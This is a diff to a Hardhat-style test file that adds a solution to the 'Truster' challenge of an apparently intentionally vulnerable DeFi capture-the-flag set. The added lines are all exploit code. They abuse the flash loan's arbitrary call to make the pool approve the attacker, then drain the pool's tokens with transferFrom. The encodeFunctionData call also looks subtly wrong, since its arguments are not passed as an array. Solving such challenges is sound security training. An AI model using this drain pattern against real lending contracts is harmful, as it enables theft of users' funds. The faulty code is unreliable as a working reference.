@@ -29,7 +29,12 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        // approve attacker to spend all DVT
+        let erc20 = new ethers.utils.Interface(["function approve(address spender, uint256 amount) external returns (bool)"])
+        let data = erc20.encodeFunctionData("approve", attacker, ethers.utils.parseEther("1000000"));
+
+        await this.pool.flashLoan(0, attacker, this.token.address, data, { from: attacker });
+        await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, { from: attacker });
     });
 
     after(async function () {
